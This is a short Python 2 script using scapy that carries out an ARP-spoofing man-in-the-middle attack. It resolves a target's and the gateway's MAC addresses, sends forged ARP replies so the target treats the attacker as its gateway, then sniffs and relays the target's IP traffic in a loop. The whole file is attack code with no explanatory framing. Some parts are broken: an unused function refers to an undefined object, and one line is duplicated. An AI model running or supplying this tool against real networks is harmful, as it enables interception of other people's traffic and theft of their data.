import os,sys,thread
import netifaces as neti
from scapy.all import *

arp_spoof = ARP()
#arp_spoof.

eth = neti.interfaces()[1]

def arp_broadcast(arg_ip):
    arp_bro = ARP()

    arp_bro.hwsrc = s_mac
    arp_bro.hwdst = "ff:ff:ff:ff:ff:ff"
    arp_bro.psrc = s_ip
    arp_bro.pdst = arg_ip

    packet = sr1(arp_bro)

    return packet[ARP].hwsrc

r_ip = sys.argv[1]
r_ip = sys.argv[1]
g_ip = neti.gateways()[neti.AF_INET][0][0]
s_ip = neti.ifaddresses(eth)[neti.AF_INET][0]['addr']
s_mac = neti.ifaddresses(eth)[neti.AF_LINK][0]['addr']
r_mac = arp_broadcast(r_ip)
g_mac = arp_broadcast(g_ip)

def arp_spoofing():
    arp_spoof.hwsrc = s_mac
    arp_spoof.hwdst = r_mac
    arp_spoof.psrc = g_ip
    arp_spoof.pdst = r_ip

    send(arp_spoof)
    print "[+] ARP Spoofing is Done!"

def spoofing_test():
    sp_test.hwsrc = s_mac
    sp_test.hwdst = r_mac
    sp_test.psrc = g_ip
    sp_test.pdst = r_ip

def packet_relay(packet):
    if (packet[IP].src == sys.argv[1] and packet[Ether].dst == s_mac):
        if packet[Ether].src == r_mac:
            packet[Ether].dst = g_mac
            packet[Ether].src = s_mac
            sendp(packet)
        elif packet[IP].dst == r_ip:
            packet[Ether].src = s_mac
            packet[Ether].dst = r_mac
            sendp(packet)
        print "[+] Packet Forwarding..."

    #elif (packet[IP].src == sys.argv[1] and packet[Ether].dst != s_mac):
    #    arp_spoofing()
    #    print "[+] Re: ARP Spoofing is Done!"

def main():
    arp_spoofing()

    while(1):
        sniff(prn=packet_relay,filter="ip", store=0, count=50)
        arp_spoofing()

if __name__ == '__main__':
    main()
